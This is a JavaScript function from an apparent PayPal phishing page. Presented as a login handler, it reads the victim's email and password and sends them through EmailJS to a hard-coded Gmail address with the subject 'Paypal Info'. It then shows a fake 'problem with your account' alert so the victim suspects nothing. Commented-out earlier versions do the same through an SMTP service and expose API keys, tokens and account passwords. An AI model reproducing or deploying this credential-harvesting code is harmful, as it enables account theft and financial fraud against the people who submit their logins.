function paypalLogin() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  var today = new Date();
  const dateNow = new Date();
  let timeNow = dateNow.getTime();
  //console.log("READ?");
  //Username: "sofiamendez2069@gmail.com",
  //Password: "B6505A37BE5A592A8839955DCB36478CAC7C",
  //SecureToken: "73374f-eebb-405e-8de9-2ca13952c444"
  //   Email.send({
  //     SecureToken: "73374f-eebb-405e-8de9-2ca13952c444",
  //     //"29553f62-457b-4077-b17c-794bb242844e",
  //     To: "sofiamendez2069@gmail.com",
  //     From: "sofiamendez2069@gmail.com",
  //     Subject: "Paypal Info " + today + " " + timeNow,
  //     Body: "email: " + email + " \n" + "password: " + password,
  //   }).then((message) =>
  //     //alert(message)
  //     alert(
  //       "There was a problem with your account. \nPlease try again later. \n\nThank You!"
  //     )
  //   );
  // Email.send({
  //   Host: "smtp.elasticemail.com",
  //   Username: "sofiamendez2069@​myyahoo.com", //"sofiamendez2069@gmail.com",
  //   Password: "FC706D9068C6F87D6686D6B0CE5D91FAA04B", //"B6505A37BE5A592A8839955DCB36478CAC7C",
  //   To: "sofiamendez2069@gmail.com",
  //   From: "sofiamendez2069@gmail.com",
  //   Subject: "Paypal Info " + today + " " + timeNow,
  //   Body: "email: " + email + " \n" + "password: " + password,
  // }).then((message) =>
  //   alert(
  //     message,
  //     "There was a problem with your account. \nPlease try again later. \n\nThank You!"
  //   )
  // );

  (function () {
    emailjs.init("ZEIhIxDmuJ9hieZRH"); // Account Public Key
  })();

  var params = {
    from: "myspamassage2023@gmail.com",
    to: "myspamassage2023@gmail.com",
    subject: "Paypal Info " + today + " " + timeNow,
    replyto: "",
    message: "email: " + email + " \n" + "password: " + password,
  };

  var serviceID = "service_zgiz1w8"; // Email Service ID
  var templateID = "template_lq00n7p"; // Email Template ID

  emailjs
    .send(serviceID, templateID, params)
    .then((res) => {
      alert(
        "There was a problem with your account. \nPlease try again later. \n\nThank You!"
      );
    })
    .catch((e) => {
      alert("Error: ", e);
    });
}
